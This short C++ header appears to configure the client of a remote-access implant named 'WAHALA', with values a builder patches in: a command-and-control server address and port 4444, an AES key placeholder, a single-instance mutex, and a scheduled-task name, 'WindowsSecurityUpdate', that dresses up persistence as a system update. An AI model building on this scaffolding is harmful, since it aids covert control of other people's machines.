#pragma once

// These values will be patched by the WAHALA Builder
namespace Config {
    constexpr const char* C2_SERVER = "127.0.0.1";
    constexpr int C2_PORT = 4444;
    constexpr const char* AES_KEY_B64 = "YOUR_32_BYTE_BASE64_KEY_HERE";
    constexpr const char* MUTEX_NAME = "WAHALA_CLIENT_MUTEX_V1";
    constexpr const char* TASK_NAME = "WindowsSecurityUpdate";
}
